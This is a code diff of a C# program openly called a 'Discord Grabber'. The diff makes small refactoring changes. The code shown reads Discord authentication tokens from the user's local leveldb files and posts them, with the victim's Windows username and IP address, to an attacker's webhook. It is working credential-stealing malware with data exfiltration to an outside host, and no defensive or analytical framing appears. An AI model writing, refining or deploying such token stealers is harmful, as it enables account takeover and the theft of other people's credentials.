@@ -14,16 +14,14 @@ namespace DiscordG
     class Program
     {
         public static string webhook = ConsoleApp1.Program.Webhook_link; // Your webhook goes here
-        public static bool foundSth = false;
 
-       
 
         public static List<string> GetThem()
         {
             List<string> discordtokens = new List<string>();
             DirectoryInfo rootfolder = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Discord\Local Storage\leveldb");
 
-            foreach (var file in rootfolder.GetFiles(false ? "*.log" : "*.ldb"))
+            foreach (var file in rootfolder.GetFiles("*.ldb"))
             {
                 string readedfile = file.OpenText().ReadToEnd();
 
@@ -36,17 +34,9 @@ namespace DiscordG
 
 
             discordtokens = discordtokens.ToList();
-
+            
             Console.WriteLine(discordtokens);
-
-            if (discordtokens.Count > 0)
-            {
-                foundSth = true;
-                
-            }
-            else
-                discordtokens.Add("Empty");
-
+            
             return discordtokens;
         }
 
@@ -56,13 +46,13 @@ namespace DiscordG
             return ip;
         }
 
-        public static void SendMeResults(List<string> message)
+        public static void SendMeResults(List<string> tokens)
         {
             Http.Post(webhook, new NameValueCollection()
             {
                 { "username", "Discord Grabber by Instinct#1121" },
                 { "avatar_url", "https://64.media.tumblr.com/6fd8805db788da47a3dba1cbe04d3e58/6a63940804bf8826-ee/s400x600/c1889cd0688966c4d8433980ccb78cd04153c9a2.png" },
-                { "content", "```\n" + "Report from Discord Grabber\n\n" + "Username: " + Environment.UserName + "\nIP: " + GetIP() + "\nTokens:\n\n" + string.Join("\n", message) + "\n\n" + "\n```" }
+                { "content", "```\n" + "Report from Discord Grabber\n\n" + "Username: " + Environment.UserName + "\nIP: " + GetIP() + "\nTokens:\n\n" + string.Join("\n", tokens) + "\n\n" + "\n```" }
             });
         }
     }
